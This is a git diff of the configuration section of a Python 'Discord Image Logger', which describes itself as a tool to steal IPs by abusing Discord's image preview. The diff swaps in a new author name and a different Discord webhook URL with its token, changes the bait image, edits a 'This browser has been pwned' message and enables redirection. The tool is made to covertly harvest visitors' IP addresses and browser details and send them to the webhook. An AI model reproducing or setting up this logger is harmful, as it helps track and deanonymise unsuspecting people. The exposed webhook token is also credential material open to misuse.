@@ -6,12 +6,12 @@ import traceback, requests, base64, httpagentparser
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
+__author__ = "F3r4ntic"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1352199659149463572/SAQzGNGKzGr3tWfizDODmP9wXdfXDbjDuxbiXc_n4Z9xO5MG2PNazsBdZ3xnNLw8cHWo",
-    "image": "https://i1.sndcdn.com/artworks-NoYLmDjKQvRf1eve-coM8ew-t1080x1080.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1362056928565399765/U4TwkHJ1c0L_RFYjU37QXZvjujaRKXiuXrSVIgCDVN8ff9VvLJd6dX0c6N3yL0tJV83w",
+    "image": "https://www.roodog.co.uk/wp-content/uploads/2023/08/IMG_1507B-scaled.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -26,7 +26,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by 200IQ's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "This browser has been pwned by F3r4ntic's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -48,7 +48,7 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
+        "redirect": True, # Redirect to a webpage?
         "page": "https://your-link.here" # Link to the webpage to redirect to 
     },
 
